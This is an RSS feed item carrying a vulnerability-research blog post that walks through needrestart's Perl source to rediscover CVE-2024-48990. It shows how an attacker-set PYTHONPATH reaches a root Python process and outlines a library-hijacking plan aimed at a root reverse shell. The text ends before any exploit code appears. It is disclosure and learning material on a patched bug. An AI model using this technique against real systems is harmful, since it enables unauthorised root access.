<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Vulnerability-Research on Ally Petitt</title>
    <link>https://ally-petitt.com:443/en/tags/vulnerability-research/</link>
    <description>Recent content in Vulnerability-Research on Ally Petitt</description>
    <generator>Hugo -- 0.123.7</generator>
    <language>en</language>
    <lastBuildDate>Mon, 25 Nov 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.com:443/en/tags/vulnerability-research/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Rediscovering CVE-2024-48990 and Crafting My Own Exploit</title>
      <link>https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/</link>
      <pubDate>Mon, 25 Nov 2024 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/ubuntu-logo.png&#34; alt=&#34;Ubuntu logo&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the &lt;code&gt;needrestart&lt;/code&gt; binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these &lt;a href=&#34;https://www.qualys.com/2024/11/19/needrestart/needrestart.txt&#34;&gt;here&lt;/a&gt;, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.&lt;/p&gt;
&lt;p&gt;I have never used &lt;code&gt;needrestart&lt;/code&gt; and I have very little familiarity with Perl, so I am going in blind. Let&amp;rsquo;s find an N-day!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: I was able to set PYTHONPATH to a location where I created a fake &lt;code&gt;importlib&lt;/code&gt; implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my &lt;a href=&#34;https://github.com/ally-petitt/CVE-2024-48990-Exploit&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;becoming-familiar-with-needrestart&#34;&gt;Becoming Familiar with &lt;code&gt;needrestart&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;I will begin by cloning the &lt;code&gt;needrestart&lt;/code&gt; repository and getting a high-level overview of what it does.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/liske/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A glance at the &lt;a href=&#34;https://github.com/liske/needrestart/blob/master/README.md&#34;&gt;README&lt;/a&gt; reveals the purpose of &lt;code&gt;needrestart&lt;/code&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;needrestart&lt;/em&gt; checks which daemons need to be restarted after library upgrades.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It seems that &lt;code&gt;needrestart&lt;/code&gt; is invoked by package managers via hook scripts in &lt;code&gt;/ex&lt;/code&gt; after library upgrades. Of course, package managers like &lt;code&gt;apt&lt;/code&gt; are typically executed with root privileges, which makes &lt;code&gt;needrestart&lt;/code&gt; a target for Local Privilege Escalation (LPE) vulnerabilities.&lt;/p&gt;
&lt;p&gt;I installed &lt;code&gt;needrestart&lt;/code&gt; from the Ubuntu repositories to interact with it directly.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt install needrestart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ needrestart --version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;needrestart 3.6 - Restart daemons after library updates.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-- snip --
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since this is version 3.6 and the patch was introduced in version 3.8, this &lt;code&gt;needrestart&lt;/code&gt; installation is vulnerable.&lt;/p&gt;
&lt;h1 id=&#34;tracking-down-cve-2024-48990&#34;&gt;Tracking Down CVE-2024-48990&lt;/h1&gt;
&lt;p&gt;The &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-48990&#34;&gt;description&lt;/a&gt; of this CVE is the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Additionally, a &lt;a href=&#34;https://github.com/liske/needrestart/commit/fcc9a4401392231bef4ef5ed026a0d7a275149ab&#34;&gt;patch&lt;/a&gt; on the file &lt;code&gt;perl/lib/NeedRestart/Interp/Python.pm&lt;/code&gt; is linked in the CVE references section with the commit message &amp;ldquo;interp: do not set PYTHONPATH environment variable to prevent a LPE&amp;rdquo;. These are very substantial hints.&lt;/p&gt;
&lt;p&gt;The patched file is in the &lt;code&gt;NeedRestart::Interp::Python&lt;/code&gt; module. This module was specified in the README as a part of the &lt;code&gt;needrestart&lt;/code&gt; interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.&lt;/p&gt;
&lt;h2 id=&#34;pythonpath-explained&#34;&gt;PYTHONPATH explained&lt;/h2&gt;
&lt;p&gt;According to the official &lt;a href=&#34;https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH&#34;&gt;Python documentation&lt;/a&gt;, &lt;code&gt;PYTHONPATH&lt;/code&gt; defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.&lt;/p&gt;
&lt;h2 id=&#34;pythonpath-assignment-in-needrestart&#34;&gt;PYTHONPATH Assignment in &lt;code&gt;needrestart&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s look at how &lt;code&gt;PYTHONPATH&lt;/code&gt; is being set within &lt;code&gt;needrestart&lt;/code&gt;. I will checkout to a vulnerable version of the source code to look further.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git checkout tags/v3.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I used the search functionality to locate where &lt;code&gt;PYTHONPATH&lt;/code&gt; is being set within the &lt;code&gt;files()&lt;/code&gt; subroutine.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-pythonpath.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;nr_parse_env()&lt;/code&gt; subroutine above is defined in &lt;code&gt;perl/lib/NeedRestart/Utils.pm&lt;/code&gt; and reads the &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/environ&lt;/code&gt; file of the Python process that it is checking and returns an array of the environment variables used by that process.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nr_parse_env&lt;/span&gt;($) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $fh;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    open($fh, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/$pid/environ&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (); &lt;span style=&#34;color:#75715e&#34;&gt;# read environment variables from environ file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    local $/ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\000&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; @env &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;$fh&amp;gt;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chomp(@env);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($fh);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; map { (&lt;span style=&#34;color:#e6db74&#34;&gt;/^([^=]+)=(.*)$/&lt;/span&gt; ? ($1, $2) : ()) } @env;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scrolling to lines 202-207 of &lt;code&gt;perl/lib/NeedRestart/Interp/Python.pm&lt;/code&gt; sheds some insight into the Python code that is executed after the &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is set.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# get include path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; ($pyread, $pywrite) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nr_fork_pipe2($self&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;{debug}, $ptable&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;{exec}, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;# Equivalent to `python -` on the CLI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; $pywrite &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;import sys\nprint(sys.path)\n&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# This code is passed into Python&amp;#39;s stdin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($pywrite);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; ($path) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;$pyread&amp;gt;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($pyread);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At a high level, this is a breakdown of the most relevant steps from the code shared so far:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The &lt;code&gt;files()&lt;/code&gt; subroutine of the Python interpreter checker is called with the PID of a Python process as the argument.&lt;/li&gt;
&lt;li&gt;The environment variables associated with that process are parsed.
&lt;ul&gt;
&lt;li&gt;If a &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is found, &lt;code&gt;$ENV&lt;/code&gt; is set to contain that value.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A forked process of Python is being launched where the code &lt;code&gt;import sys\nprint(sys.path)\n&lt;/code&gt; is being executed.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;the-env-variable&#34;&gt;The &lt;code&gt;%ENV&lt;/code&gt; Variable&lt;/h3&gt;
&lt;p&gt;As stated in the &lt;a href=&#34;https://perldoc.perl.org/Env&#34;&gt;Perl documentation&lt;/a&gt;, &amp;ldquo;Perl maintains environment variables in a special hash named %ENV&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Even though &lt;code&gt;%ENV&lt;/code&gt; is not explicitly passed as a parameter to the child Python process that is being created by &lt;code&gt;needrestart&lt;/code&gt;, Perl will still carry over those values behind the scenes, which is why the value of &lt;code&gt;%ENV&lt;/code&gt; is significant.&lt;/p&gt;
&lt;h3 id=&#34;seed-of-an-attack-idea&#34;&gt;Seed of an Attack Idea&lt;/h3&gt;
&lt;p&gt;A potential attack strategy is forming: launch a Python process with the &lt;code&gt;PYTHONPATH&lt;/code&gt; set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.&lt;/p&gt;
&lt;p&gt;Before we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trigger the Python interpreter scan to check an attacker-controlled process.&lt;/li&gt;
&lt;li&gt;Identify a Python library that can be hijacked.
&lt;ul&gt;
&lt;li&gt;The imported module &lt;code&gt;sys&lt;/code&gt; is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for &lt;code&gt;sys&lt;/code&gt;, we will have to be more creative with our approach.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;triggering-the-python-interpreter-check&#34;&gt;Triggering the Python Interpreter Check&lt;/h3&gt;
&lt;p&gt;As &lt;a href=&#34;https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/#tracking-down-cve-2024-48990&#34;&gt;previously mentioned&lt;/a&gt;, &lt;code&gt;needrestart&lt;/code&gt; supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the &lt;code&gt;needrestart_interp_check()&lt;/code&gt; subroutine on a given process in &lt;code&gt;perl/lib/NeedRestart.pm&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;needrestart_interp_check&lt;/span&gt;($$$$$) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $interp (values %Interps) { &lt;span style=&#34;color:#75715e&#34;&gt;# iterate through Python, Ruby, Perl, and Java interpreter checkers&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($interp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;isa($pid, $bin)) { &lt;span style=&#34;color:#75715e&#34;&gt;# check that argv[0] of the process is supported by the current interpreter checker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; %files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $interp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;files($pid, &lt;span style=&#34;color:#f92672&#34;&gt;\&lt;/span&gt;%InterpCache); &lt;span style=&#34;color:#75715e&#34;&gt;# call the vulnerable files() subroutine on the process&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In turn, &lt;code&gt;needrestart_interp_check()&lt;/code&gt; is called in line 584 by the main &lt;code&gt;/needrestart&lt;/code&gt; Perl script when &lt;code&gt;$restart&lt;/code&gt; is false and &lt;code&gt;interpscan&lt;/code&gt; is not disabled by the configuration.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;unless&lt;/span&gt;($restart &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$nrconf{interpscan}) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $restart&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(needrestart_interp_check($nrconf{verbosity} &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Luckily, &lt;code&gt;$nrconf{interpscan}&lt;/code&gt; is enabled by default.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-nrconf.png&#34; alt=&#34;&amp;lt;code&amp;gt;$nrconf{interpscan}&amp;lt;/code&amp;gt; being set to 0&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Another factor to consider is the PID that is being passed to &lt;code&gt;needrestart_interp_check()&lt;/code&gt; since that corresponds with the process that the &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is being read from. Searching for the value of &lt;code&gt;$pid&lt;/code&gt; in &lt;code&gt;/needrestart&lt;/code&gt; reveals that the program iterates through a list of PIDs stored in &lt;code&gt;$ptable&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $ptable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nr_ptable();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid (sort {$a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;=&amp;gt;&lt;/span&gt; $b} keys %$ptable) {
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;$ptable&lt;/code&gt; hash is populated with a list of all process objects accessible to the user executing &lt;code&gt;needrestart&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; %ptable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    local $SIG{__WARN__} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; {};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    %ptable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map {$_&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;pid &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $_} @{ &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Proc::ProcessTable(enable_ttys &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;table };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nr_ptable&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;\&lt;/span&gt;%ptable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This verifies that we will be able to invoke &lt;code&gt;needrestart_interp_check()&lt;/code&gt; with the PID of our malicious process since all of the processes are iterated through.&lt;/p&gt;
&lt;h1 id=&#34;exploit-development&#34;&gt;Exploit Development&lt;/h1&gt;
&lt;h2 id=&#34;flushing-out-the-plan&#34;&gt;Flushing out the Plan&lt;/h2&gt;
&lt;p&gt;Since I couldn&amp;rsquo;t do library path hijacking with the built-in &lt;code&gt;sys&lt;/code&gt; module, I thought about other options that I could target within the short Python snippet &lt;code&gt;import sys\nprint(sys.path)&lt;/code&gt; that is executed in &lt;code&gt;Python.pm&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There are two other notable tokens aside from &lt;code&gt;sys&lt;/code&gt;: &lt;code&gt;print&lt;/code&gt; and &lt;code&gt;import&lt;/code&gt;. I decided to read more about how &lt;code&gt;import&lt;/code&gt; in the official &lt;a href=&#34;https://docs.python.org/3/reference/simple_stmts.html#import&#34;&gt;documentation&lt;/a&gt;. In particular, this snippet from the docs stood out to me:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;importlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It seems that using the &lt;code&gt;import&lt;/code&gt; statement in python can trigger the &lt;code&gt;importlib&lt;/code&gt; module. I used the &lt;code&gt;find&lt;/code&gt; command to verify that &lt;code&gt;importlib&lt;/code&gt; is indeed a dynamically loaded library rather than a Python built-in like &lt;code&gt;sys&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ find / -name importlib 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/python3.12/importlib
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Maybe we can take advantage of &lt;code&gt;importlib&lt;/code&gt; being dynamically loaded along with the fact that the contents of &lt;code&gt;__init__.py&lt;/code&gt; are automatically executed when a module is loaded. I created a directory in &lt;code&gt;/tmp/needrestart&lt;/code&gt; with the following structure:&lt;/p&gt;
